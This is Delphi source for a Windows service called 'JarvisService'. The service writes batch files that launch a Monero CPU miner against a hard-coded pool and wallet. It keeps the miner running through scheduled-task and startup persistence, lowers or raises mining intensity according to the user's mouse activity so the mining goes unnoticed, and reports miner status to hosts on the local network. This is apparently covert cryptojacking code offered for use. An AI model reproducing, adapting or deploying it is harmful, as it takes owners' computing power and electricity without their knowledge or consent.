unit main;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Classes, Vcl.Graphics, Vcl.Controls, Vcl.SvcMgr, Vcl.Dialogs, gvar,
  IdContext, IdBaseComponent, IdComponent, IdCustomTCPServer, IdTCPServer, ShlObj,
  IdTCPConnection, IdTCPClient, Registry, Vcl.ExtCtrls;

type
  TJarvisService = class(TService)
    tcpserverserver: TIdTCPServer;
    client: TIdTCPClient;
    Timer1: TTimer;
    procedure ServiceExecute(Sender: TService);
    procedure ServiceStop(Sender: TService; var Stopped: Boolean);
    procedure tcpserverserverExecute(AContext: TIdContext);
    procedure Timer1Timer(Sender: TObject);
  private
    { Private declarations }
  public
    function GetServiceController: TServiceController; override;
    { Public declarations }
  end;

var
  JarvisService: TJarvisService;
  LastTrueHost:string;

implementation

{$R *.dfm}

procedure ServiceController(CtrlCode: DWord); stdcall;
begin
  JarvisService.Controller(CtrlCode);
end;

function TJarvisService.GetServiceController: TServiceController;
begin
  Result := ServiceController;
end;

procedure TJarvisService.ServiceExecute(Sender: TService);
var f:TextFile;
Folder: Pchar; //путь к StartUp
  List: PitemidList; //список "специальных" папок
  s:string;
begin
  EXEPath:=extractfilepath(paramstr(0));
  if FileExists(EXEPath+'NsCpuCNMiner64.exe') then CPUMinerName := 'NsCpuCNMiner64.exe'
    else if FileExists(EXEPath+'NsCpuCNMiner32.exe') then CPUMinerName := 'NsCpuCNMiner32.exe'
      else exit;

  try
   AssignFile(f,EXEPath+'kill.bat');
   Rewrite(f);
   Writeln(f,'taskkill.exe /F /IM '+CPUMinerName);
   CloseFile(f);
  except
  end;

  try
   AssignFile(f,EXEPath+'runmine.bat');
   Rewrite(f);
   Writeln(f,CPUMinerName+' -o stratum+tcp://xmr.hashinvest.net:5555 -u 47TQjJaMJCx6HG3hymDrUNeSxDMZYqrL2GpAJ8kNLjFdaDgQdFwzWV5i9pSwowuJGacbGDCDU6Wt4W2Ne4LggJkjNFQUNH3 -p x -t 4');
   CloseFile(f);
  except
  end;

  try
   AssignFile(f,EXEPath+'runmine2.bat');
   Rewrite(f);
   Writeln(f,CPUMinerName+' -o stratum+tcp://xmr.hashinvest.net:5555 -u 47TQjJaMJCx6HG3hymDrUNeSxDMZYqrL2GpAJ8kNLjFdaDgQdFwzWV5i9pSwowuJGacbGDCDU6Wt4W2Ne4LggJkjNFQUNH3 -p x -t 2');
   CloseFile(f);
  except
  end;

  ProverkaRegZadaniy(); // Проверка и пересоздание регзаданий

  {+++++++++++++++ Первичная проверка и запуск майнинга +++++++++++++++}
  if ProcessCount(CPUMinerName) > 1 then KillCPUMiner;
  if NOT FindProcess(CPUMinerName) then RunCPUMiner(true);
  {--------------- Первичная проверка и запуск майнинга --------------- }

  if FileExists(EXEPath+'mpos.exe') then  RunOnStartup('mpos', EXEPath+'mpos.exe',False ); // Автозапуск MousePos
  tcpserverserver.Active := true;
   while NOT StopSignal do
  begin
    if ProcessCount(CPUMinerName) > 1 then KillCPUMiner;

    if LastTrueHost = '' then LastTrueHost := '192.168.1.10';

    client.Host := LastTrueHost;
    try
      client.Connect;
      LastTrueHost := client.Host;
    except
     client.Host := '192.168.1.3';
     try
       client.Connect;
       LastTrueHost := client.Host;
     except
     end;
    end;

    if client.Connected then
    begin
      if FindProcess(CPUMinerName) then s:='Run' else s:='none';

      client.Socket.WriteLn('@'+GetComputerNName+';'+s+';'+DateTimeToStr(LastActiveTime));
      client.Disconnect;
    end;

   { // Это проверка сервиса
   AssignFile(f,'c:\123.txt');
   Rewrite(f);
   Writeln(f,TimeToStr(now)+' - '+Inttostr(MousePos.X)+':'+inttostr(MousePos.Y));
   CloseFile(f);
   }

   sleep(500);
   ReportStatus;
   ServiceThread.ProcessRequests(false);
  end;
end;

procedure TJarvisService.ServiceStop(Sender: TService; var Stopped: Boolean);
begin
  KillProcess('mpos.exe');
  StopSignal := True;
end;

procedure TJarvisService.tcpserverserverExecute(AContext: TIdContext);
var s,XPos,YPos:string;
i:Integer;
one:BOOL;
begin
 try
 s:= AContext.Connection.Socket.ReadLn();
 one:=True;
 for i := 1 to Length(s) do
 if Copy(s,i,1) <> ';' then
  begin
   if one then XPos:=XPos+Copy(s,i,1) else YPos:=YPos+Copy(s,i,1);
  end
 else one:=false;
 MousePos.X := StrToInt(XPos);
 MousePos.Y := StrToInt(YPos);

 if Round( (Now - LastActiveTime) * 24 * 60 * 60 ) > 600 then // Проверять активность юзера за последние 5 минут
  begin
    if (MousePos.X = LastMousePos.X) and (MousePos.y = LastMousePos.y) then
    begin
      UserActive := False;
      if FindProcess('NsCpuCNMiner64.exe') then KillCPUMiner;
      RunCPUMiner();

    end;
    LastMousePos := MousePos;
    LastActiveTime := Now;
  end;

  if ((MousePos.X <> LastMousePos.X) or (MousePos.y <> LastMousePos.y)) and NOT UserActive then
  begin
   UserActive := true;
   if FindProcess('NsCpuCNMiner64.exe') then KillCPUMiner;
   RunCPUMiner(true);
  end;

  LastMousePosOneSec := MousePos;
 except

 end;

end;

procedure TJarvisService.Timer1Timer(Sender: TObject);
begin
  if NOT FindProcess(CPUMinerName) then RunCPUMiner(true);
end;

end.
